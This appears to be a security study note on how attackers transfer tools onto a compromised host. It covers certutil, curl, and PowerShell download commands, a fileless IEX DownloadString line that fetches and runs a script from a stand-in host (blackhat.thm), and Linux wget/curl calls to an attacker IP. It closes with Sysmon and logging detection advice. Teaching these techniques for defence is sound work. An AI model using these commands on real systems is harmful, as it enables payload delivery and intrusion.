### General Notes

Once an attacker has access to a host, they often need to pull additional tooling onto it (payloads, enumeration scripts, C2 agents).
- This is the [[MITRE ATT&CK]] technique [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/).
- Attackers prefer signed, built-in Windows binaries for this (*Living off the Land Binaries*, or **LOLBins**), because they are already present, usually trusted, and blend in with normal admin activity.
- A common trick is to download the payload under a benign output name (e.g. `good.exe`) to look less suspicious.

> See [LOLBAS](https://lolbas-project.github.io/) for the catalogue of built-in binaries abused this way.

---
### Certutil

```cmd
certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe
```
- `certutil` is a certificate utility, but `-urlcache` lets it fetch an arbitrary URL and write it to disk, which makes it a download tool.
- `-f` forces a fresh download, overwriting any cached copy.
- The last argument is the local output file.

> `certutil` writes a copy of every downloaded file into its cache under `%LOCALAPPDATA%\Microsoft\Windows\CryptnetUrlCache`, which survives even if the attacker deletes the output file. This is a useful forensic artifact.

---
### Curl

```cmd
curl.exe https://blackhat.thm/bad.exe -o good.exe
```
- `curl.exe` ships with Windows 10 (build 1803+) and Windows Server 2019+, so it can be assumed present on modern hosts.
- `-o` writes the response body to the named file.
- Use `curl.exe`, not `curl`, in PowerShell: bare `curl` is an alias for `Invoke-WebRequest`, which has different syntax.

---
### PowerShell

```powershell
powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"
```
- `Invoke-WebRequest` (alias `iwr`, `wget`, `curl`) sends an HTTP request and, with `-OutFile`, saves the response body to disk.
- `-c` (`-Command`) runs the command string and exits.

A fileless variant downloads a script straight into memory and runs it, leaving nothing on disk:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://blackhat.thm/script.ps1')
```
- `DownloadString` returns the response as a string instead of writing a file.
- `IEX` (`Invoke-Expression`) executes that string as PowerShell. This is why `DownloadString` + `IEX` is a strong detection signal.

> `New-Object Net.WebClient` also has `DownloadFile(url, path)` for the on-disk equivalent of `-OutFile`, and `Start-BitsTransfer -Source <url> -Destination <path>` uses the background transfer service to blend in further.

---
### Linux

```bash
# On the attacker's machine, in the folder holding the tool:
python3 -m http.server 80
```
- Spins up a quick HTTP server to host the payload.

```bash
# On the target:
wget http://<attacker-ip>/bad.sh -O good.sh
curl http://<attacker-ip>/bad.sh -o good.sh
```
- `wget -O` and `curl -o` both save the download to a named file.
- See [[Linux Privilege Escalation#Automated Enumeration Tools]] for this exact workflow used to transfer enumeration scripts.

---
### Prevention & Detection

Detect this through command-line auditing and the network connections these binaries make.
- **[[Sysmon]] Event ID 1** (process creation): flag command lines where `certutil` carries `-urlcache` / `-f`, or where `curl` / `Invoke-WebRequest` use `-o` / `-OutFile` pointing at an executable.
- **Sysmon Event ID 3** (network connection): a connection made by `certutil.exe` is almost always malicious, since it has no business reaching the internet on a normal host.
- **Sysmon Event ID 11** (file create): a new `.exe` written to a user-writable path (`Downloads`, `%TEMP%`, `%APPDATA%`) right after one of these processes ran.
- **PowerShell script block logging (Event ID `4104`)**: catches `DownloadString`, `IEX`, and `Invoke-WebRequest` even when obfuscated.
- See [[Windows Forensics#PowerShell Investigation]] for the forensic side.

---
